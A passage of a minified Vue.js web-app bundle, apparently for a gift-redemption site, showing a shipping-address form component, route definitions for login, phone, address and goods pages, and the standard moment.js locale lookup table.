"),n("b-field",{attrs:{label:"收货地址"}},[n("b-input",{attrs:{placeholder:"请输入您的收货地址"},model:{value:t.address,callback:function(e){t.address=e},expression:"address"}})],1)],1),t._v(" "),n("b-button",{attrs:{type:"is-danger"},on:{click:t.goSuccess}},[t._v("下一步")])],1)},staticRenderFns:[function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticStyle:{display:"flex",color:"red",padding:"5px"}},[e("h3",[this._v("为了您顺利兑换礼品,请正确填写以下信息")])])}]};var C=n("VU/8")(P,q,!1,function(t){n("5qh7")},"data-v-4a587209",null).exports;s.default.use(g.a);var N=new g.a({routes:[{path:"/index",name:"index",component:f},{path:"/login",name:"login",component:y},{path:"/phone",name:"phone",component:z},{path:"/success",name:"success",component:I},{path:"/Address",name:"address",component:C},{path:"/Goods",name:"goods",component:F}]}),$=n("O3Oo"),H=n.n($),R=(n("/KV2"),n("7QTg")),T=n.n(R);n("v2ns");s.default.use(H.a),s.default.use(T.a),s.default.config.productionTip=!1,new s.default({el:"#app",router:N,components:{App:u},template:"<App/>"}),window.userinfo={haslogin:!1}},OxTP:function(t,e){},ZZvA:function(t,e){},nteQ:function(t,e){},"q/Ne":function(t,e){},uslO:function(t,e,n){var s={"./af":"3CJN","./af.js":"3CJN","./ar":"3MVc","./ar-dz":"tkWw","./ar-dz.js":"tkWw","./ar-kw":"j8cJ","./ar-kw.js":"j8cJ","./ar-ly":"wPpW","./ar-ly.js":"wPpW","./ar-ma":"dURR","./ar-ma.js":"dURR","./ar-sa":"7OnE","./ar-sa.js":"7OnE","./ar-tn":"BEem","./ar-tn.js":"BEem","./ar.js":"3MVc","./az":"eHwN","./az.js":"eHwN","./be":"3hfc","./be.js":"3hfc","./bg":"lOED","./bg.js":"lOED","./bm":"hng5","./bm.js":"hng5","./bn":"aM0x","./bn.js":"aM0x","./bo":"w2Hs","./bo.js":"w2Hs","./br":"OSsP","./br.js":"OSsP","./bs":"aqvp","./bs.js":"aqvp","./ca":"wIgY","./ca.js":"wIgY","./cs":"ssxj","./cs.js":"ssxj","./cv":"N3vo","./cv.js":"N3vo","./cy":"ZFGz","./cy.js":"ZFGz","./da":"YBA/","./da.js":"YBA/","./de":"DOkx","./de-at":"8v14","./de-at.js":"8v14","./de-ch":"Frex","./de-ch.js":"Frex","./de.js":"DOkx","./dv":"rIuo","./dv.js":"rIuo","./el":"CFqe","./el.js":"CFqe","./en-SG":"oYA3","./en-SG.js":"oYA3","./en-au":"Sjoy","./en-au.js":"Sjoy","./en-ca":"Tqun","./en-ca.js":"Tqun","./en-gb":"hPuz","./en-gb.js":"hPuz","./en-ie":"ALEw","./en-ie.js":"ALEw","./en-il":"QZk1","./en-il.js":"QZk1","./en-nz":"dyB6","./en-nz.js":"dyB6","./eo":"Nd3h","./eo.js":"Nd3h","./es":"LT9G","./es-do":"7MHZ","./es-do.js":"7MHZ","./es-us":"INcR","./es-us.js":"INcR","./es.js":"LT9G","./et":"XlWM","./et.js":"XlWM","./eu":"sqLM","./eu.js":"sqLM","./fa":"2pmY","./fa.js":"2pmY","./fi":"nS2h","./fi.js":"nS2h","./fo":"OVPi","./fo.js":"OVPi","./fr":"tzHd","./fr-ca":"bXQP","./fr-ca.js":"bXQP","./fr-ch":"VK9h","./fr-ch.js":"VK9h","./fr.js":"tzHd","./fy":"g7KF","./fy.js":"g7KF","./ga":"U5Iz","./ga.js":"U5Iz","./gd":"nLOz","./gd.js":"nLOz","./gl":"FuaP","./gl.js":"FuaP","./gom-latn":"+27R","./gom-latn.js":"+27R","./gu":"rtsW","./gu.js":"rtsW","./he":"Nzt2","./he.js":"Nzt2","./hi":"ETHv","./hi.js":"ETHv","./hr":"V4qH","./hr.js":"V4qH","./hu":"xne+","./hu.js":"xne+","./hy-am":"GrS7","./hy-am.js":"GrS7","./id":"yRTJ","./id.js":"yRTJ","./is":"upln","./is.js":"upln","./it":"FKXc","./it-ch":"/E8D","./it-ch.js":"/E8D","./it.js":"FKXc","./ja":"ORgI","./ja.js":"ORgI","./jv":"JwiF","./jv.js":"JwiF","./ka":"RnJI","./ka.js":"RnJI","./kk":"j+vx","./kk.js":"j+vx","./km":"5j66","./km.js":"5j66","./kn":"gEQe","./kn.js":"gEQe","./ko":"eBB/","./ko.js":"eBB/","./ku":"kI9l","./ku.js":"kI9l","./ky":"6cf8","./ky.js":"6cf8","./lb":"z3hR","./lb.js":"z3hR","./lo":"nE8X","./lo.js":"nE8X","./lt":"/6P1","./lt.js":"/6P1","./lv":"jxEH","./lv.js":"jxEH","./me":"svD2","./me.js":"svD2","./mi":"gEU3","./mi.js":"gEU3","./mk":"Ab7C","./mk.js":"Ab7C","./ml":"oo1B","./ml.js":"oo1B","./mn":"CqHt","./mn.js":"CqHt","./mr":"5vPg","./mr.js":"5vPg","./ms":"ooba","./ms-my":"G++c","./ms-my.js":"G++c","./ms.js":"ooba","./mt":"oCzW","./mt.js":"oCzW","./my":"F+2e","./my.js":"F+2e","./nb":"FlzV","./nb.js":"FlzV","./ne":"/mhn","./ne.js":"/mhn","./nl":"3K28","./nl-be":"Bp2f","./nl-be.js":"Bp2f","./nl.js":"3K28","./nn":"C7av","./nn.js":"C7av","./pa-in":"pfs9","./pa-in.js":"pfs9","./pl":"7LV+","./pl.js":"7LV+","./pt":"ZoSI","./pt-br":"AoDM","./pt-br.js":"AoDM","./pt.js":"ZoSI","./ro":"wT5f","./ro.js":"wT5f","./ru":"ulq9","./ru.js":"ulq9","./sd":"fW1y","./sd.js":"fW1y","./se":"5Omq","./se.js":"5Omq","./si":"Lgqo","./si.js":"Lgqo","./sk":"OUMt","./sk.js":"OUMt","./sl":"2s1U","./sl.js":"2s1U","./sq":"V0td","./sq.js":"V0td","./sr":"f4W3","./sr-cyrl":"c1x4","./sr-cyrl.js":"c1x4","./sr.js":"f4W3","./ss":"7Q8x","./ss.js":"7Q8x","./sv":"Fpqq","./sv.js":"Fpqq","./sw":"DSXN","./sw.js":"DSXN","./ta":"+7/x","./ta.js":"+7/x","./te":"Nlnz","./te.js":"Nlnz","./tet":"gUgh","./tet.js":"gUgh","./tg":"5SNd","./tg.js":"5SNd","./th":"XzD+","./th.js":"XzD+","./tl-ph":"3LKG","./tl-ph.js":"3LKG","./tlh":"m7yE","./tlh.js":"m7yE","./tr":"k+5o","./tr.js":"k+5o","./tzl":"iNtv","./tzl.js":"iNtv","./tzm":"FRPF","./tzm-latn":"krPU","./tzm-latn.js":"krPU","./tzm.js":"FRPF","./ug-cn":"To0v","./ug-cn.js":"To0v","./uk":"ntHu","./uk.js":"ntHu","./ur":"uSe8","./ur.js":"uSe8","./uz":"XU1s","./uz-latn":"/bsm","./uz-latn.js":"/bsm","./uz.js":"XU1s","./vi":"0X8Q","./vi.js":"0X8Q","./x-pseudo":"e/KL","./x-pseudo.js":"e/KL","./yo":"YXlc","./yo.js":"YXlc","./zh-cn":"Vz2w","./zh-cn.js":"Vz2w","./zh-hk":"ZUyn","./zh-hk.js":"ZUyn","./zh-tw":"BbgG","./zh-tw.js":"BbgG"};function i(t){return n(a(t))}function a(t){var e=s[t];if(!(e+1))throw new Error("Cannot find module '"+t+"'.");return e}i.keys=function(){return Object.keys(s)},i.resolve=a,t.exports=i,i.id="uslO"},v2ns:function(t,e){}},["NHnr"]);
//# sourceMappingURL=app.a168294e0cce30029d02.js.map